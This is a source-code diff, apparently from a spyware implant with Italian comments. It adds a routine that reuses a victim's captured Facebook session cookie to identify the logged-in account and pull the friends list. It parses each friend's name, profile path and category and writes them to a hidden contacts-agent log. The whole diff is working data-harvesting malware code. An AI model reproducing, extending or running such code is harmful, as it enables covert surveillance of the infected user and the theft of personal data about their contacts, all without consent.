@@ -18,6 +18,10 @@
 #define FB_INVALID_TSTAMP 0xFFFFFFFF
 
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
+extern BOOL bPM_ContactsStarted; 
+
+extern BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page);
+extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 
 typedef struct {
 	char user[48];
@@ -99,7 +103,7 @@ void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi)
 	}
 }
 
-DWORD HandleFaceBook(char *cookie)
+DWORD HandleFBMessages(char *cookie)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -297,3 +301,122 @@ DWORD HandleFaceBook(char *cookie)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
+
+#define FB_CONTACT_IDENTIFIER "\"user\",\"text\":\""
+#define FB_CPATH_IDENTIFIER ",\"path\":\""
+#define FB_CATEGORY_IDENTIFIER ",\"category\":\""
+DWORD HandleFBContacts(char *cookie)
+{
+	DWORD ret_val;
+	BYTE *r_buffer = NULL;
+	DWORD response_len;
+	char *parser1, *parser2, *parser3;
+	WCHAR fb_request[256];
+	char user[256];
+	WCHAR *name_w, *profile_w, *category_w;
+	char contact_name[256];
+	char profile_path[256];
+	char category[256];
+	static BOOL scanned = FALSE;
+	HANDLE hfile;
+
+	CheckProcessStatus();
+
+	if (!bPM_ContactsStarted)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+
+	if (scanned)
+		return SOCIAL_REQUEST_SUCCESS;
+	
+	// Identifica l'utente
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
+	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+		return ret_val;
+	parser1 = strstr((char *)r_buffer, "\"user\":\"");
+	if (!parser1) {
+		SAFE_FREE(r_buffer);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+	parser1 += strlen("\"user\":\"");
+	parser2 = strchr(parser1, '\"');
+	if (!parser2) {
+		SAFE_FREE(r_buffer);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+	*parser2=0;
+	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+	SAFE_FREE(r_buffer);
+
+	// Torna utente "0" se non siamo loggati
+	if (!strcmp(user, "0"))
+		return SOCIAL_REQUEST_BAD_COOKIE;
+
+	// Chiede la lista dei contatti
+	_snwprintf_s(fb_request, sizeof(fb_request)/sizeof(WCHAR), _TRUNCATE, L"/ajax/typeahead/first_degree.php?__a=1&viewer=%S&token=v7&filter[0]=user&options[0]=friends_only&__user=%S", user, user);
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", fb_request, 80, NULL, 0, &r_buffer, &response_len, cookie);
+	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+		return ret_val;
+
+	CheckProcessStatus();
+	parser1 = (char *)r_buffer;
+	
+	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+	for (;;) {
+		parser1 = strstr(parser1, FB_CONTACT_IDENTIFIER);
+		if (!parser1)
+			break;
+		parser1 += strlen(FB_CONTACT_IDENTIFIER);
+		parser2 = strchr(parser1, '\"');
+		if (!parser2)
+			break;
+		*parser2 = NULL;
+		_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser1);
+		parser1 = parser2 + 1;
+
+		parser1 = strstr(parser1, FB_CPATH_IDENTIFIER);
+		if (!parser1)
+			break;
+		parser1 += strlen(FB_CPATH_IDENTIFIER);
+		parser2 = strchr(parser1, '\"');
+		if (!parser2)
+			break;
+		*parser2 = NULL;
+		_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
+		parser1 = parser2 + 1;
+
+		// Verifica se c'e' category
+		category[0]=NULL;
+		parser2 = strstr(parser1, FB_CATEGORY_IDENTIFIER);
+		if (parser2) {
+			parser3 = strstr(parser1, FB_CONTACT_IDENTIFIER);
+			if (!parser3 || parser3>parser2) {
+				parser1 = parser2;
+				parser1 += strlen(FB_CATEGORY_IDENTIFIER);
+				parser2 = strchr(parser1, '\"');
+				if (!parser2)
+					break;
+				*parser2 = NULL;
+				_snprintf_s(category, sizeof(category), _TRUNCATE, "%s", parser1);
+				parser1 = parser2 + 1;
+			}
+		}
+		JsonDecode(contact_name);
+		JsonDecode(profile_path);
+		JsonDecode(category);
+
+		name_w = UTF8_2_UTF16(contact_name);
+		profile_w = UTF8_2_UTF16(profile_path);
+		category_w = UTF8_2_UTF16(category);
+
+		DumpContact(hfile, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w);
+		
+		SAFE_FREE(name_w);
+		SAFE_FREE(profile_w);
+		SAFE_FREE(category_w);
+	}
+	Log_CloseFile(hfile);
+
+	scanned = TRUE;
+	SAFE_FREE(r_buffer);
+	return SOCIAL_REQUEST_SUCCESS;
+}
